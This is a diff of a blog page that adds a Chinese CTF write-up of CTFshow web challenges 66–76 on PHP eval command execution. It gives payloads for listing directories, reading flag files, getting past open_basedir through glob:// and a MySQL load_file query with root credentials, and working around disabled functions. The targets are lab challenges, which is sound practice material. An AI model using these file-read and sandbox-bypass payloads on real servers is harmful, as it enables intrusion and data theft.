@@ -161,7 +161,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [BJDCTF 2nd]EasyBaBa
+                                CTFshow Web入门 命令执行篇
                             </h1>
                             
                                 <!--en-->
@@ -171,35 +171,244 @@
                                         Ro1ing
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-01-30</a>
+                                Date: <a href="#">2021-06-07</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">0.1
+                                    href="#">6.8
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">45</a></span>
+                                    <span class="post-words">words:<a href="#">1280</a></span>
                                     
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://Ro1ing.github.io/tag/KVyIyIkRw/">Misc</a>
-                                
-                                <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">CTF</a>
-                                
-                            </span>
-                                        
                                 </div>
                                 
                         </header>
                         
                         <div class="post-content">
-                            <p>感觉 有东西压缩在里面 foremost分离</p>
-<p>解压出一个 里面都是出题人.jpg</p>
-<p>16进制查看是 视频格式 扫码得到 一点都不Easy😅</p>
+                            <h2 id="web66">web66</h2>
+<pre><code>c=print_r(scandir('/'));
+</code></pre>
+<p>回显</p>
+<pre><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )
+</code></pre>
+<pre><code>c=highlight_file('/flag.txt');
+</code></pre>
+<p>得到flag<br>
+也可以使用文件包含</p>
+<pre><code>c=include('/flag.txt');
+c=require('/flag.txt');
+c=require_once('/flag.txt');
+</code></pre>
+<blockquote>
+<p>require_once()语句在脚本执行期间包含并运行指定文件(通俗一点，括号内的文件会执行一遍)。此行为和require()语句类似，唯一区别是如果该文件中的代码已经被包含了，则不会再次包含</p>
+</blockquote>
+<h2 id="web67">Web67</h2>
+<pre><code>c=highlight_file('/flag.txt');
+</code></pre>
+<h2 id="web68">Web68</h2>
+<pre><code>c=include('flag.php');echo $flag;
+秀秀得了不在这
+扫下根目录
+c=print_r(scandir('/'));
+print_r也被过滤了
+换方法
+c=var_dump(scandir('/'));
+</code></pre>
+<p>获得根目录 发现.txt</p>
+<pre><code>array(21) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; }
+</code></pre>
+<pre><code>c=include(&quot;/flag.txt&quot;);//得到；没有php标签 所以使用html形式输出
+</code></pre>
+<h2 id="web69">Web69</h2>
+<pre><code>c=include(&quot;/flag.txt&quot;);
+</code></pre>
+<h2 id="web70">Web70</h2>
+<pre><code>Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
+
+Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
+
+Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21
+你要上天吗？
+</code></pre>
+<pre><code>c=include('/flag.txt');
+</code></pre>
+<h2 id="web71">Web71</h2>
+<p>看index.php</p>
+<pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+ini_set('display_errors', 0);
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+        $s = ob_get_contents();//得到输出缓冲区内容
+        ob_end_clean();//清空缓冲区
+        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);//对内容进行一个替换
+}else{
+    highlight_file(__FILE__);
+}
+
+?&gt;
+
+你要上天吗？
+</code></pre>
+<p><img src="https://Ro1ing.github.io/post-images/1623072540529.jpg" alt="" loading="lazy"><br>
+思路：在ob_get_contents()函数之前中断指令。</p>
+<pre><code>c=include('/flag.txt');exit();
+</code></pre>
+<h2 id="web72">Web72</h2>
+<pre><code>c=var_dump(scandir('/'));exit();
+返回
+Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
+Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
+Warning: scandir(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html/) in /var/www/html/index.php(19) : eval()'d code on line 1
+Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/index.php(19) : eval()'d code on line 1
+Warning: scandir(): (errno 1): Operation not permitted in /var/www/html/index.php(19) : eval()'d code on line 1
+Warning: var_dump() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 1
+</code></pre>
+<pre><code>c=var_dump(scandir('/'));
+
+???????: ?????_?????????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???_???() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???????(): ????_??????? ??????????? ?? ??????. ????(/) ?? ??? ?????? ??? ??????? ????(?): (/???/???/????/) ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???????(/): ?????? ?? ???? ???: ????????? ??? ????????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???????(): (????? ?): ????????? ??? ????????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???_????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? 你要上天吗？
+</code></pre>
+<p>查询不到根目录内容 发现很多函数都不能用了</p>
+<pre><code>c=$a = &quot;glob:///*.txt&quot;;//根目录下所有txt
+if($b = opendir($a)){
+ while (($file = readdir($b))!== false) {//循环读取
+  echo &quot;filename:&quot;.$file.&quot;\n&quot;;
+}
+closedir($b);//关闭
+}
+exit();
+</code></pre>
+<p>回显</p>
+<pre><code>Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
+Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
+filename:flag0.txt
+</code></pre>
+<p>然后采用脚本绕过<br>
+72poc.php ctfshow群里有<br>
+选中c后面的内容然后点击url编码<br>
+<img src="assets/image-20210510210830-4ytgdcv.png" alt="" loading="lazy"><br>
+这个脚本是国外的开源项目</p>
+<h2 id="web73">Web73</h2>
+<p>使用脚本</p>
+<pre><code>Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 154
+Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 154
+UAF failed
+</code></pre>
+<p>strlen()函数被过滤<br>
+使用自定函数代替</p>
+<pre><code>&lt;?php
+//strlen // 返回指定字符串的长度
+
+function strlen_user($s) {
+	return count(str_split($s));
+}
+
+echo strlen_user('abc');
+
+?&gt;
+</code></pre>
+<p>写入poc 将 所有的strlen替换成strlen_user<br>
+将其提交回显：</p>
+<pre><code>Fatal error: Possible integer overflow in memory allocation (4162900904 * 32 + 32) in /var/www/html/index.php(19) : eval()'d code on line 30
+</code></pre>
+<p>内存溢出<br>
+重新扫描一下可能读取的文件有问题</p>
+<pre><code>c=$a = &quot;glob:///*.txt&quot;;//根目录下所有txt
+if($b = opendir($a)){
+ while (($file = readdir($b))!== false) {//循环读取
+  echo &quot;filename:&quot;.$file.&quot;\n&quot;;
+}
+closedir($b);//关闭
+}
+exit();
+#filename:flagc.txt
+</code></pre>
+<p>改一下<br>
+还是产生溢出</p>
+<pre><code>&lt;?php
+//strlen // 返回指定字符串的长度
+
+function strlen_user($s) {
+    $rot=0;
+    for ($i=0;$i&lt;100000;$i++){
+        if($s[$i]){
+            $ret=$ret+1;
+        }
+        else{
+            break;
+        }
+    }
+        return $ret;
+}
+
+?&gt;
+</code></pre>
+<p>替换；报错状态码502；题目流量被清洗了 题目问题。</p>
+<h2 id="web74">Web74</h2>
+<p>先查看当前目录文件<br>
+根目录下 filename:flagx.txt</p>
+<pre><code>c=include(&quot;/flagx.txt&quot;);exit();
+</code></pre>
+<h2 id="web75">Web75</h2>
+<p>先使用 ((20210512195233-q5lu0du &quot;{{.text}}&quot;))</p>
+<blockquote>
+<p>filename:flag36.txt</p>
+</blockquote>
+<pre><code>```c=include(&quot;/flag36.txt&quot;);exit();
+</code></pre>
+<p>被拦截了<br>
+Payload:</p>
+<pre><code>try { $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); foreach ($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row) { echo ($row[0]) . &quot;|&quot;; } $dbh = null;
+} catch (PDOException $e) { echo $e-&gt;getMessage(); exit(0);
+}
+exit(0);
+</code></pre>
+<p>数据库的连接是<strong>读配置文件</strong>得到的<br>
+拿SQL语句来读文件绕过open_basedir和disable_function的姿势</p>
+<h2 id="web76">Web76</h2>
+<blockquote>
+<p>filename:flag36d.txt</p>
+</blockquote>
+<pre><code>c=try { $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); foreach ($dbh-&gt;query('select load_file(&quot;/flag36d.txt&quot;)') as $row) { echo ($row[0]) . &quot;|&quot;; } $dbh = null;
+} catch (PDOException $e) { echo $e-&gt;getMessage(); exit(0);
+}
+exit(0);
+</code></pre>
+<p>得到</p>
 
                         </div>
                         
                             <div class="post-toc">
-                                
+                                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#web66">web66</a></li>
+<li><a href="#web67">Web67</a></li>
+<li><a href="#web68">Web68</a></li>
+<li><a href="#web69">Web69</a></li>
+<li><a href="#web70">Web70</a></li>
+<li><a href="#web71">Web71</a></li>
+<li><a href="#web72">Web72</a></li>
+<li><a href="#web73">Web73</a></li>
+<li><a href="#web74">Web74</a></li>
+<li><a href="#web75">Web75</a></li>
+<li><a href="#web76">Web76</a></li>
+</ul>
+</li>
+</ul>
+
                             </div>
                             
                                 
@@ -213,7 +422,7 @@
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/">https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/</a></span>
+                                                <span><a href="https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/">https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -228,9 +437,9 @@
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/&sharesource=qzone&title=[BJDCTF 2nd]EasyBaBa&pics=https://Ro1ing.github.io/images/avatar.png?v=1623072542173&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/bjdctf-2ndeasybaba/&sharesource=weibo&title=[BJDCTF 2nd]EasyBaBa + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1623072542173 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/&sharesource=qzone&title=CTFshow Web入门 命令执行篇&pics=https://Ro1ing.github.io/images/avatar.png?v=1623072542173&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/&sharesource=weibo&title=CTFshow Web入门 命令执行篇 + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1623072542173 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -239,16 +448,6 @@
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
-                        
-                        <a href="https://Ro1ing.github.io/tag/KVyIyIkRw/">#
-                                                Misc
-                                                    </a>
-                                                    
-                        <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">#
-                                                CTF
-                                                    </a>
-                                                    
-                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -261,13 +460,9 @@
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://Ro1ing.github.io/post/asis-2019unicorn-shop/">
-                                                                                            [ASIS 2019]Unicorn shop
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/bjdctf2020easy-md5/">
-                                                                                                    [BJDCTF2020]Easy MD5
+                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/bsidescf-2019svgmagic/">
+                                                                                                    [BSidesCF 2019]SVGMagic
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
